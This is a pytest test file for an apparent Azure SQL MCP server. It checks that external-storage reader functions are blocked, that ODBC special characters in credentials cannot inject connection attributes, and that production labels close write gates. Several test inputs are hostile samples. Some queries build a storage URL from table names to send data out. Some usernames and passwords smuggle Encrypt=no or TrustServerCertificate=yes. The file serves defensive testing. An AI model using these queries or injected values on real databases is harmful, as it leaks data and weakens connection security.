"""Review findings 100, 101 and 102 on the read-only gate, the SQL-password
connection string and the non-production gate."""

from __future__ import annotations

import pytest
from mssql_python.connection_string_parser import _ConnectionStringParser

from azure_sql_mcp.auth import AzureSqlAuthenticator
from azure_sql_mcp.config import AuthMode
from azure_sql_mcp.database_policy import DatabasePolicy
from azure_sql_mcp.database_policy import classify_environment
from azure_sql_mcp.safe_sql import AdmissionStatus
from azure_sql_mcp.safe_sql import SafeSqlValidator


# --- finding 100: functions that read external storage by URL -----------------


@pytest.mark.parametrize(
    "sql",
    [
        # The URL is built from catalog data: the engine would contact a host
        # or path that carries database content.
        "SELECT * FROM sys.fn_xe_file_target_read_file('https://x.blob.core.windows.net/c/' "
        "+ (SELECT TOP 1 name FROM sys.tables) + '.xel', NULL, NULL, NULL)",
        "SELECT * FROM fn_xe_file_target_read_file('https://x/c/*.xel', NULL, NULL, NULL)",
        "SELECT * FROM [sys].[fn_xe_file_target_read_file]('https://x/c/*.xel', NULL, NULL, NULL)",
        "SELECT * FROM sys . fn_xe_file_target_read_file ('a', NULL, NULL, NULL)",
        "SELECT t.name, f.event_data FROM sys.tables AS t CROSS APPLY "
        "sys.fn_xe_file_target_read_file('https://x/' + t.name, NULL, NULL, NULL) AS f",
        "SELECT * FROM sys.fn_get_audit_file('https://x/c/', DEFAULT, DEFAULT)",
        'SELECT * FROM "sys"."fn_get_audit_file"(\'a\', DEFAULT, DEFAULT)',
        "SELECT * FROM sys.FN_GET_AUDIT_FILE_V2('https://x/c/', DEFAULT, DEFAULT, '2020', '2021')",
        "SELECT * FROM sys.fn_xe_telemetry_blob_target_read_file('el', NULL, NULL, NULL)",
    ],
)
def test_external_storage_readers_are_rejected(sql: str) -> None:
    outcome = SafeSqlValidator().analyze_read_only(sql)

    assert outcome.admission_status is AdmissionStatus.NOT_ADMITTED
    assert "not allowed in restricted mode" in (outcome.reason or "")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM [sys].[fn_get_sql](0x01)",
        "SELECT * FROM sys.[fn_servershareddrives]()",
        'SELECT * FROM "fn_get_sql"(0x01)',
    ],
)
def test_a_delimited_name_does_not_hide_a_blocked_function(sql: str) -> None:
    outcome = SafeSqlValidator().analyze_read_only(sql)

    assert outcome.admission_status is AdmissionStatus.NOT_ADMITTED


def test_ring_buffer_event_reads_stay_admitted() -> None:
    # Deadlock and event reads from the in-memory target need no URL.
    outcome = SafeSqlValidator().analyze_read_only(
        "SELECT CAST(t.target_data AS xml) FROM sys.dm_xe_database_session_targets AS t "
        "WHERE t.target_name = 'ring_buffer'"
    )

    assert outcome.admission_status is AdmissionStatus.ADMITTED


# --- finding 101: SQL-password connection string ------------------------------


@pytest.mark.parametrize(
    ("username", "password"),
    [
        ("app_reader", "pa;ss"),
        ("app_reader", "{starts-with-brace"),
        ("app_reader", "ends}with;Encrypt=no"),
        ("svc;TrustServerCertificate=yes", "plain"),
        ("app_reader", " leading and trailing "),
    ],
)
def test_sql_password_with_odbc_special_characters_reaches_the_driver_whole(
    server_config_factory, username: str, password: str
) -> None:
    # A strong password with ';' must log in, and must not add or change
    # another connection attribute such as Encrypt.
    authenticator = AzureSqlAuthenticator(
        server_config_factory(
            auth_mode=AuthMode.SQL_PASSWORD, username=username, password=password
        )
    )

    connection_string = authenticator.build_connection_arguments("appdb").connection_string
    parsed = _ConnectionStringParser(validate_keywords=False)._parse(connection_string)

    assert parsed["uid"] == username
    assert parsed["pwd"] == password
    assert parsed["encrypt"] == "yes"
    assert parsed["trustservercertificate"] == "no"
    assert set(parsed) == {"server", "database", "encrypt", "trustservercertificate", "uid", "pwd"}


def test_plain_sql_credentials_keep_their_connection_string(server_config_factory) -> None:
    authenticator = AzureSqlAuthenticator(
        server_config_factory(
            auth_mode=AuthMode.SQL_PASSWORD, username="sa", password="P@ssw0rd!"
        )
    )

    assert authenticator.build_connection_arguments("appdb").connection_string.endswith(
        "UID=sa;PWD=P@ssw0rd!;"
    )


# --- finding 102: the non-production gate -------------------------------------


def _policy(environment: str) -> DatabasePolicy:
    return DatabasePolicy.from_mapping(
        "appdb",
        {
            "environment": environment,
            "allow_read": True,
            "allow_view_apply": True,
            "allow_test_indexes": True,
        },
    )


@pytest.mark.parametrize(
    "environment",
    ["prd", "PRD", "prod-eu", "prod_weu", "production-uk", "Live-2", "test-prod-copy", " prod "],
)
def test_a_production_label_in_any_spelling_closes_the_non_production_gates(
    environment: str,
) -> None:
    # ALTER VIEW and temporary indexes must never reach a production database
    # because its label was written 'prd' and not 'prod'.
    policy = _policy(environment)

    assert classify_environment(environment) == "production"
    assert policy.is_non_production is False
    assert policy.is_production is True
    assert policy.can_apply_view() is False
    assert policy.can_run_index_experiment() is False


@pytest.mark.parametrize("environment", ["customer-a", "blue", "eu-west", "primary"])
def test_an_unrecognized_label_is_not_treated_as_non_production(environment: str) -> None:
    policy = _policy(environment)

    assert classify_environment(environment) == "unrecognized"
    assert policy.is_non_production is False
    assert policy.is_production is True
    assert policy.can_apply_view() is False
    assert policy.can_run_index_experiment() is False


@pytest.mark.parametrize(
    "environment",
    [
        "development", "dev", "test", "qa", "uat", "sandbox", "staging", "preprod",
        "pre-prod", "non-production", "dev-eu", "Test_2", "bench",
    ],
)
def test_a_known_non_production_label_keeps_the_gates_open(environment: str) -> None:
    policy = _policy(environment)

    assert classify_environment(environment) == "non_production"
    assert policy.is_non_production is True
    assert policy.is_production is False
    assert policy.can_apply_view() is True
    assert policy.can_run_index_experiment() is True
